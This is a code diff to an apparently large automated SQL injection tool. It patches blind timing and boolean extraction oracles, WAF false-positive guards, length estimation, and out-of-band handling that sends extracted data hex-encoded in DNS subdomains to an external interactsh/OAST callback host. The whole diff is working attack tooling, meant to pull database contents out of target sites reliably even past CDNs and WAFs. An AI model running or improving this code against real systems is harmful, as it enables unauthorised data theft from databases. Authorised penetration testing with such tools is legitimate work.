@@ -48238,6 +48238,40 @@ class Enumerator:
                 print(f"[+] [Extract] Timing fallback oracle active ({self.dbms}, "
                       f"t={_t_sec_tf}s, thresh={_t_thresh_tf:.0f}ms)", flush=True)
 
+                # FIX-TIMING-ORACLE-VALIDATION (CRITICAL): Before using the timing fallback
+                # for extraction, validate that the oracle can actually differentiate
+                # true/false conditions. On CDN-cached targets, cached responses return at
+                # ~same latency regardless of payload, making the timing oracle blind — all
+                # binary search probes converge to the same value, producing garbage chars.
+                # Self-test: true condition (sleep fires) vs false condition (no sleep),
+                # both probes sent with cache-busting nonces. If margin < thresh/2, abort.
+                _tf_valid = True
+                try:
+                    _tf_test_t = await _timing_eval_fn_tf("1=1")  # sleep FIRES
+                    _tf_test_f = await _timing_eval_fn_tf("1=2")  # sleep does NOT fire
+                    # If both return same value (both True or both False), oracle is blind
+                    if _tf_test_t is not None and _tf_test_f is not None:
+                        if _tf_test_t == _tf_test_f:
+                            _tf_valid = False
+                            print(
+                                f"[!] [Extract] Timing fallback oracle FAILED validation: "
+                                f"true/false probes both returned {_tf_test_t!r} — "
+                                f"CDN caching or very low timing margin; "
+                                f"BatchExtract with this oracle would produce garbage. "
+                                f"Aborting timing-based extraction.", flush=True)
+                        else:
+                            print(f"[+] [Extract] Timing fallback oracle validated "
+                                  f"(true={_tf_test_t} false={_tf_test_f})", flush=True)
+                    elif _tf_test_t is None and _tf_test_f is None:
+                        _tf_valid = False
+                        print("[!] [Extract] Timing fallback oracle FAILED validation "
+                              "(both probes WAF-blocked)", flush=True)
+                except Exception as _tf_val_e:
+                    LOG.debug("[_extract_str] timing-fallback self-test error: %s", _tf_val_e)
+                if not _tf_valid:
+                    _eval_fn = None  # disarm so "No oracle available" fires below
+                    _oracle_name = "timing_fallback_invalid"
+
         if not _eval_fn:
             # All oracle paths exhausted — log clearly and return empty.
             LOG.warning(
@@ -49478,44 +49512,55 @@ class OOBDetector:
 
     async def detect(self,method,url,data,data_fmt,param,original,tamper_chain,dbms_hint="")->Optional[DetectionResult]:
         LOG.info(f"OOB detection: param={param!r} server={self.server}")
-        try:
-            fp=await self.engine.send("GET",f"{self.server}/register",params={"id":self.token})
-            # BUG-FIX-OOB-1: Validate fp and fp.body before json.loads()
-            if not _validate_response(fp, func_name="OOBDetector.detect"):
-                domain="oast.pro"
-            else:
-                try:
-                    _body_bytes = _extract_body_safe(fp, func_name="OOBDetector.detect")
-                    _body_str = _body_bytes.decode('utf-8', errors='replace') if isinstance(_body_bytes, bytes) else str(_body_bytes)
-                    data_reg = json.loads(_body_str)
-                    domain = data_reg.get("domain", "oast.pro")
-                except (json.JSONDecodeError, ValueError, AttributeError):
-                    domain = "oast.pro"
-        except Exception: domain="oast.pro"
-        # BUG-OOB-DOMAIN-NOT-PERSISTED FIX: The registered OAST session domain
-        # (e.g. "wybsgdfrnbpzqjmfocelnjfvzq8j6las2.oast.fun") was obtained here
-        # but NEVER stored. All extraction code uses config.oob_server (the base
-        # URL like "https://oast.pro"), strips to "oast.pro", and sends DNS queries
-        # there — but the OAST server only listens at "*.sessionid.oast.fun".
-        # Detection worked because it used the session domain locally.
-        # Extraction always failed silently because it used the wrong domain.
-        # Fix: persist both token and registered domain so extraction can use them.
+        # FIX-OOB-PRECONFIG (CRITICAL): When --oob-domain is specified, the arg-
+        # parsing code pre-sets config._oob_registered_domain to the user's full
+        # callback domain (e.g. "aitlttgserrmsjibhyvo21byfocux597j.oast.fun") and
+        # config._oob_server_session_id to its first label.  We must NOT call
+        # /register in that case — doing so would create a brand-new OAST session
+        # and overwrite the pre-configured values with the server-assigned domain,
+        # making all DNS payloads and poll requests target the WRONG session.
+        _preconfig_domain = getattr(self.config, "_oob_registered_domain", None)
+        if _preconfig_domain:
+            # Use user-specified domain — skip OAST registration entirely.
+            domain = _preconfig_domain
+            _server_session_id = getattr(
+                self.config, "_oob_server_session_id",
+                domain.split(".")[0] if "." in domain else domain
+            )
+            LOG.info(f"OOB using pre-configured domain={domain} (--oob-domain specified)")
+        else:
+            try:
+                fp=await self.engine.send("GET",f"{self.server}/register",params={"id":self.token})
+                # BUG-FIX-OOB-1: Validate fp and fp.body before json.loads()
+                if not _validate_response(fp, func_name="OOBDetector.detect"):
+                    domain="oast.pro"
+                else:
+                    try:
+                        _body_bytes = _extract_body_safe(fp, func_name="OOBDetector.detect")
+                        _body_str = _body_bytes.decode('utf-8', errors='replace') if isinstance(_body_bytes, bytes) else str(_body_bytes)
+                        data_reg = json.loads(_body_str)
+                        domain = data_reg.get("domain", "oast.pro")
+                    except (json.JSONDecodeError, ValueError, AttributeError):
+                        domain = "oast.pro"
+            except Exception: domain="oast.pro"
+            # BUG-OOB-DOMAIN-NOT-PERSISTED FIX: The registered OAST session domain
+            # (e.g. "wybsgdfrnbpzqjmfocelnjfvzq8j6las2.oast.fun") was obtained here
+            # but NEVER stored. All extraction code uses config.oob_server (the base
+            # URL like "https://oast.pro"), strips to "oast.pro", and sends DNS queries
+            # there — but the OAST server only listens at "*.sessionid.oast.fun".
+            # Detection worked because it used the session domain locally.
+            # Extraction always failed silently because it used the wrong domain.
+            # Fix: persist both token and registered domain so extraction can use them.
+            # BUG-OAST-SESSION-ID FIX: interact.sh assigns its OWN session ID as the
+            # domain prefix, which may differ from our registration token.
+            _server_session_id = domain.split(".")[0] if domain and "." in domain else ""
+            try:
+                self.config._oob_registered_domain = domain
+                self.config._oob_registered_token = self.token  # our token (for auth)
+                self.config._oob_server_session_id = _server_session_id  # server's id
+            except Exception:
+                pass
         self.domain = domain  # store on instance for use by exfiltrate()
-        # BUG-OAST-SESSION-ID FIX: interact.sh assigns its OWN session ID as the
-        # domain prefix, which may differ from our registration token.
-        # E.g. we register with id=sqrxyz123abc, server returns domain=
-        # "wybsgdfrnbpzqjmfocelnjfvzq8j6las2.oast.fun". The server session ID is
-        # "wybsgdfrnbpzqjmfocelnjfvzq8j6las2", NOT "sqrxyz123abc".
-        # Polling with id=sqrxyz123abc may return nothing if server uses own session id.
-        # Fix: extract the server-assigned session ID from the domain first label,
-        # persist both IDs, and try both when polling.
-        _server_session_id = domain.split(".")[0] if domain and "." in domain else ""
-        try:
-            self.config._oob_registered_domain = domain
-            self.config._oob_registered_token = self.token  # our token (for auth)
-            self.config._oob_server_session_id = _server_session_id  # server's id
-        except Exception:
-            pass
         LOG.info(f"OOB token={self.token}.{domain} [persisted to config._oob_registered_domain]")
         dbms_list=[dbms_hint] if dbms_hint else list(OOB_PAYLOADS_MAP.keys())
         for dbms in dbms_list:
@@ -93859,7 +93904,12 @@ class MultiOracleConsensusExtractor:
             # AND missing COALESCE NULL guard (LENGTH returns NULL for NULL subqueries →
             # binary search never converges → length=0 → empty output for all NULL columns).
             # Fix: COALESCE(LENGTH(({sql_query})::text),0).
-            len_func = f"COALESCE(LENGTH(({sql_query})::text),0)"
+            # FIX-MOCE-PG-CHAR-LENGTH: LENGTH() in PostgreSQL returns byte count for
+            # UTF-8 text; CHAR_LENGTH() returns Unicode character count. For any column
+            # containing multi-byte characters (Cyrillic, CJK, emoji, etc.) LENGTH()
+            # overestimates the character count, causing binary search to read garbage
+            # bytes past the string's actual end. Use CHAR_LENGTH() throughout.
+            len_func = f"COALESCE(CHAR_LENGTH(({sql_query})::text),0)"
         elif self.dbms in ("MSSQL", "Sybase"):
             # BUG-V168-MOCE-LEN-MSSQL-NO-TOP1 FIX (HIGH): The previous expression was
             # ISNULL(DATALENGTH(CONVERT(NVARCHAR(MAX),({sql_query})))/2,0) without
@@ -104549,8 +104599,15 @@ class TechniqueCascadeEngine:
                         _wassr_early_dist = float(_we_m.group(1))
             except Exception:
                 pass
+        # FIX-ST-FP-SHORTCUT-A (CRITICAL): Wasserstein dist >= 0.50 can be produced by
+        # comparing two WAF block pages (both probes returning 400/403) rather than by
+        # SQL-controlled response differences. The WAF returns slightly different challenge
+        # bodies for each request (nonce tokens, ray-IDs), giving high Wasserstein distance
+        # with zero SQL injection. Guard: when det._both_probes_waf_blocked=True the
+        # Wasserstein signal is unreliable — require explicit _fp_guards_preconfirmed instead.
+        _wassr_probe_both_blocked = bool(getattr(det, '_both_probes_waf_blocked', False)) if det else False
         _wassr_preconfirmed_early = (
-            _wassr_early_dist >= 0.50 or
+            (_wassr_early_dist >= 0.50 and not _wassr_probe_both_blocked) or
             bool(getattr(det, '_fp_guards_preconfirmed', False))
         ) if det else False
 
@@ -114552,6 +114609,15 @@ class TechniqueCascadeEngine:
                         try:
                             _det_b._fp_guards_preconfirmed = True
                             _det_b._fp_guards_confidence = _wass_conf_val
+                            # FIX-ST-FP-WASS-BLOCKED: If BOTH true-condition and false-condition
+                            # probes were WAF-blocked (400/403/406/429), the Wasserstein distance
+                            # reflects WAF page token variance, not SQL-controlled differences.
+                            # Flag this so Shortcut A can detect and reject this false positive.
+                            _waf_block_statuses = {400, 403, 406, 429}
+                            _true_status  = getattr(fp,     'status_code', 0) or 0
+                            _false_status = getattr(_fp_f2, 'status_code', 0) or 0
+                            if _true_status in _waf_block_statuses and _false_status in _waf_block_statuses:
+                                _det_b._both_probes_waf_blocked = True
                         except Exception:
                             pass
                     return _det_b
@@ -132394,9 +132460,14 @@ class MultiStrategyExtractor:
                         _final_tmpl = _tmpl.replace("{cond_expr}", _cond_fmt)
                         _strategies.insert(0, (_sn, _tp, f"stacked timing: {_sn}"))
                             # Wire directly into sleep_arith
+                        # FIX-SINGLE-SAMPLE-THRESH: average both pairs (raw + tamper) for
+                        # a more jitter-resistant midpoint threshold instead of single-pair.
+                        _thresh_stk = ((ms_t + ms_f + ms_t2 + ms_f2) / 4
+                                       if ms_t > 30 and ms_f > 30 and ms_t2 > 30 and ms_f2 > 30
+                                       else ((ms_t + ms_f) / 2 if _use_raw else (ms_t2 + ms_f2) / 2))
                         self._sleep_info = {
                             "template": _final_tmpl,
-                            "thresh": (ms_t + ms_f) / 2 if _use_raw else (ms_t2 + ms_f2) / 2,
+                            "thresh": _thresh_stk,
                             "t": 5, "stacked": True,
                             "use_raw": _use_raw
                         }
@@ -132454,7 +132525,12 @@ class MultiStrategyExtractor:
                                 _tmpl = _num_cond if _all_nums else None
                         
                         if _tmpl:
-                            _thresh = (ms_t + ms_f) / 2
+                            # FIX-SINGLE-SAMPLE-THRESH: threshold from a single pair is
+                            # susceptible to CDN/network jitter. Average both measurement
+                            # pairs (initial + re-validation) for a more stable midpoint.
+                            _thresh = ((ms_t + ms_f + ms_t2 + ms_f2) / 4
+                                       if ms_t2 > 30 and ms_f2 > 30
+                                       else (ms_t + ms_f) / 2)
                             self._sleep_info = {
                                 "template": _tmpl,
                                 "thresh": _thresh,
@@ -133251,11 +133327,27 @@ class MultiStrategyExtractor:
         prefix = self._load_progress(_label)
         _start_pos = len(prefix) + 1
         # Smart length estimation
+        # FIX-MSE-LEN-CHR1-FP (CRITICAL): The original `expr >= chr(1)*N` comparison is
+        # ALWAYS True for any string beginning with a printable character, because in SQL
+        # lexicographic comparison the first character (e.g. 'h') sorts above chr(1)
+        # regardless of string length. This caused the length estimate loop to never break,
+        # max_len stayed at its initial value, and extraction wasted time searching past EOS.
+        # Fix: use DBMS-specific length functions (CHAR_LENGTH/LENGTHC/LEN/LENGTH) which
+        # compare numeric lengths directly — always correct for any string content.
         if not prefix:
+            if self.dbms == "Oracle":
+                _mse_lenf = f"NVL(LENGTHC({expr}),0)"
+            elif self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                _mse_lenf = f"COALESCE(CHAR_LENGTH({expr}),0)"
+            elif self.dbms in ("MSSQL", "Sybase"):
+                _mse_lenf = f"ISNULL(LEN(CONVERT(NVARCHAR(MAX),{expr})),0)"
+            elif self.dbms == "SQLite":
+                _mse_lenf = f"COALESCE(LENGTH({expr}),0)"
+            else:
+                _mse_lenf = f"COALESCE(CHAR_LENGTH({expr}),0)"
             for _pl in [4, 8, 16, 32, 64]:
                 if _pl > max_len: break
-                _tl = chr(1) * _pl
-                _longer = await self.eval_condition(f"{expr}>={self._quote_val(_tl)}")
+                _longer = await self.eval_condition(f"{_mse_lenf}>={_pl}")
                 if not _longer:
                     max_len = _pl
                     print(f"[MSE] Length estimate: <={_pl} chars", flush=True)
@@ -133742,8 +133834,14 @@ class MultiStrategyExtractor:
             return ""
         if self.dbms in ("MySQL", "MariaDB"):
             sep, _sep_close = '`', '`'
-        elif self.dbms in ("MSSQL",):
+        elif self.dbms in ("MSSQL", "Sybase"):
             sep, _sep_close = '[', ']'
+        elif self.dbms in ("Oracle", "PostgreSQL", "CockroachDB", "YugabyteDB",
+                           "Amazon Redshift", "SQLite"):
+            # FIX-IDENT-QUOTING: Oracle/PG/SQLite use double-quotes for identifiers.
+            # Without quoting, reserved-word column/table names (e.g. "table", "select",
+            # "user", "order") raise ORA-00904 / PG syntax error on every extraction probe.
+            sep, _sep_close = '"', '"'
         else:
             sep, _sep_close = '', ''
 
@@ -135342,7 +135440,7 @@ class SideChannelExtractor:
         print("", flush=True)
         print("[SideChannel] ", flush=True)
         print("[SideChannel]   Check your callback server for DNS/HTTP    ", flush=True)
-        print(f"[SideChannel]   queries to: *.{callback_host[:30]:<30s} ", flush=True)
+        print(f"[SideChannel]   queries to: *.{callback_host} ", flush=True)
         print("[SideChannel]   Data is hex-encoded in the subdomain       ", flush=True)
         print("[SideChannel]   Decode with: echo HEX | xxd -r -p         ", flush=True)
         print("[SideChannel] ", flush=True)
@@ -138111,7 +138209,13 @@ class ScannerV15(ScannerV14):
 
         # Safe mode verification
         self._ui.set_status("Pre-scan verification")
-        if getattr(cfg,"safe_verify",True) and not getattr(cfg,"skip_verify",False):
+        # FIX-ORACLE-NONDETERMINISM: Multiple HTTP-method surfaces (PUT/PATCH/POST) each
+        # call _v14_init, each running SafeModeVerifier on the SAME shared config object.
+        # Each run can hit a different CDN edge node → different boolean_capable result →
+        # different oracle mode → log shows 3 identical "[oracle=timing_only]" blocks.
+        # Guard: if cfg._oracle_mode is already set (first surface completed verification),
+        # skip re-running for subsequent surfaces so they inherit the cached result.
+        if getattr(cfg,"safe_verify",True) and not getattr(cfg,"skip_verify",False) and getattr(cfg,"_oracle_mode",None) is None:
             first_params = {}
             # BUG-SAFEVERIFY-WRONG-PARAM FIX (CRITICAL): The previous code called
             # ParameterParser.from_url(url) to select the probe param/original for
@@ -161736,7 +161840,30 @@ async def main():
     # --no-reflection-norm: flip the positive flag
     if getattr(args,"no_reflection_norm",False):  config.reflection_norm = False
     if getattr(args,"inject_headers",False):  config.inject_headers = True
-    if getattr(args,"oob_domain",None):        config.oob_server = args.oob_domain
+    if getattr(args,"oob_domain",None):
+        # FIX-OOB-SERVER (CRITICAL): args.oob_domain is the full DNS callback domain
+        # (e.g. "aitlttgserrmsjibhyvo21byfocux597j.oast.fun"). Storing it raw as
+        # config.oob_server caused the REST poll URL to be constructed as
+        # "aitlttgserrmsjibhyvo21byfocux597j.oast.fun/poll?id=..." (no scheme, wrong host).
+        # Fix: derive the REST API base URL from the parent domain (last two labels),
+        # store the full subdomain as the session token used in DNS callback subdomain
+        # construction, and pre-populate _oob_registered_domain / _oob_registered_token
+        # so SideChannelExtractor can build correct poll URLs like
+        # "https://oast.fun/poll?id=aitlttgserrmsjibhyvo21byfocux597j".
+        _oob_dom_raw = args.oob_domain.strip().rstrip("/")
+        if "://" not in _oob_dom_raw:
+            _oob_dom_parts = _oob_dom_raw.split(".")
+            _oob_parent = ".".join(_oob_dom_parts[-2:]) if len(_oob_dom_parts) >= 2 else _oob_dom_raw
+            _oob_session_id = _oob_dom_parts[0] if len(_oob_dom_parts) >= 2 else _oob_dom_raw
+            config.oob_server = f"https://{_oob_parent}"
+            try:
+                config._oob_registered_domain  = _oob_dom_raw
+                config._oob_registered_token   = _oob_session_id
+                config._oob_server_session_id  = _oob_session_id
+            except Exception:
+                pass
+        else:
+            config.oob_server = _oob_dom_raw
     if getattr(args,"dbms",None):              config.forced_dbms = normalize_dbms(args.dbms)
     if getattr(args,"no_stability",False):    config.no_stability = True
     if getattr(args,"extract_delay",None) is not None: config.extract_delay = args.extract_delay
